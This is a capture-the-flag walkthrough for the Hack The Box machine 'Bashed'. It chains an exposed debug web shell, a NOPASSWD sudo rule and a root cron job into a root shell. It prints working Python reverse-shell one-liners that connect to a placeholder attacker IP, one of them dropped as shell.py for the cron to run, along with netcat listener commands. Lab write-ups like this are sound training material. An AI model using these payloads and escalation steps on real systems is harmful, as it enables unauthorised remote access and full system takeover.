## Box Info

**Target:** `bashed.htb` (`10.129.1.37`, swap for your instance IP) · **Difficulty:** Easy · **OS:** Linux

**The gist:** a developer left a debug web shell exposed publicly, which is basically RCE handed to you on a plate. From there, a `NOPASSWD` sudo rule and a root-owned cron job (with a very specific, easy-to-miss quirk in how it globs filenames) chain together into full root. A great one for practicing "always check `sudo -l`" and "always check what cron is actually running" as reflexes.

## 3. Upgrade to a Reverse Shell

A web shell is clunky to work in for long, worth upgrading to a proper interactive shell before going any further.

**On Kali, start a listener first:**
```bash
nc -lnvp 1235
```

**In the phpbash web shell**, paste (swap in the actual Kali `tun0` IP):
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_KALI_IP",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
> 🔍 Full breakdown of the `os.dup2()` mechanics (why three calls, why that order): [[Shells & Payloads (Breakdowns)#Python os.dup2() reverse shell, and why three calls in that specific order|Command Breakdowns]]
> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) and **PayloadsAllTheThings** Reverse Shell Cheatsheet: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), both good sources for this same Python one-liner (or an alternative in a different language) if the target's shell doesn't have Python available.

The listener catches a shell as `www-data`. Upgrade to a full TTY:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 4. Privilege Escalation Path 1: www-data → scriptmanager

Check sudo rights, the very first thing worth doing on any freshly-landed shell:
```bash
sudo -l
```
You'll see:
```
(scriptmanager : scriptmanager) NOPASSWD: ALL
```
This means `www-data` can become `scriptmanager` with no password at all. Do it:
```bash
sudo -u scriptmanager /bin/bash
```
Confirm:
```bash
id
```

> 📸 Screenshot: the `sudo -l` output, and the resulting `id` confirming `scriptmanager`

> 🔗 **GTFOBins**: [gtfobins.github.io](https://gtfobins.github.io/), always worth checking any `sudo -l` output against this site. Here the escalation path is a full `NOPASSWD: ALL` rule rather than a single restricted binary, so GTFOBins' specific per-binary entries don't apply directly, but the habit of checking is the same one worth building regardless.

## 5. Enumerate as scriptmanager

Look around scriptmanager's home directory and permissions:
```bash
ls -ld /scripts
cd /scripts
ls -l
```
You'll find:
- `test.py`, owned by scriptmanager, writable
- `test.txt`, owned by **root**, and its contents keep regenerating every minute or so

That regeneration is the real giveaway here: something running as root is executing `.py` files in this folder on a timer, a cron job. `test.py` itself just writes "testing 123!" to `test.txt`, but whatever process runs it, runs as root.

You can confirm the cron itself once root access is actually in hand:
```bash
crontab -l
# or check
cat /etc/crontab
```
It reads:
```
* * * * * cd /scripts; for f in *.py; do python "$f"; done
```
This loop runs **every visible `.py` file** in `/scripts` once a minute, as root. One important detail: `*.py` is a bash glob, and bash globs do **not** match hidden dotfiles (`.foo.py`). So whatever payload gets dropped here, its filename must not start with a dot, or the cron will silently skip right over it.

> 🔍 Full breakdown of why bash globs skip dotfiles (and why that's the whole exploit here): [[Privilege Escalation & Local Exploitation (Breakdowns)#Root cron job iterating *.py: the dotfile-exclusion gotcha|Command Breakdowns]]

> 📸 Screenshot: `test.txt`'s contents regenerating, and the crontab entry once confirmed

## 6. Privilege Escalation Path 2, scriptmanager → root

**Step 1: start a listener on Kali (new terminal/port):**
```bash
nc -lnvp 31337
```

**Step 2: drop a reverse shell payload into `/scripts`.**

As scriptmanager, in `/scripts`:
```bash
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_KALI_IP\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > shell.py
```
A couple of things worth being careful about here:
- Swap `YOUR_KALI_IP` for the real `tun0` IP.
- The file is named `shell.py`, no leading dot, or the cron's glob will silently ignore it (per Step 5's gotcha).
- **Don't run this file directly.** If it gets executed by hand, the shell that connects back is just scriptmanager again, not root. The whole point is letting the cron job (which runs as root) be the one that executes it.

**Step 3: wait.** Cron fires once a minute, so within about 60 seconds it'll pick up `shell.py` and run it.

**Step 4: catch the root shell.** The `nc -lnvp 31337` listener should receive a connection. Verify:
```bash
id
```
Expected:
```
uid=0(root) gid=0(root) groups=0(root)
```
Upgrade the shell for comfort:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

> 📸 Screenshot: the root shell landing on the listener, `id` confirming `uid=0`

## Summary of the Chain

| Step | Access | Method |
|---|---|---|
| 1 | www-data | phpbash web shell exposed at `/dev/phpbash.php` |
| 2 | scriptmanager | `sudo -u scriptmanager /bin/bash` (`NOPASSWD: ALL` misconfig) |
| 3 | root | Cron job runs any `.py` file in `/scripts` every minute as root, drop a reverse shell payload and wait |

**Root causes / lessons worth carrying forward:**
- Exposing a dev/debug web shell (`phpbash.php`) publicly is functionally full RCE-as-a-service. Dev tooling never belongs on a production-reachable path.
- A `NOPASSWD: ALL` sudo rule to another user is nearly as good as sudo to root outright, if that user has any privileged access path of their own.
- A root-owned cron job that executes files from a directory writable by a lower-privileged user is a classic privesc vector. Always run `ls -la` on any directory referenced by cron, and check write permissions on anything root's crontab touches.
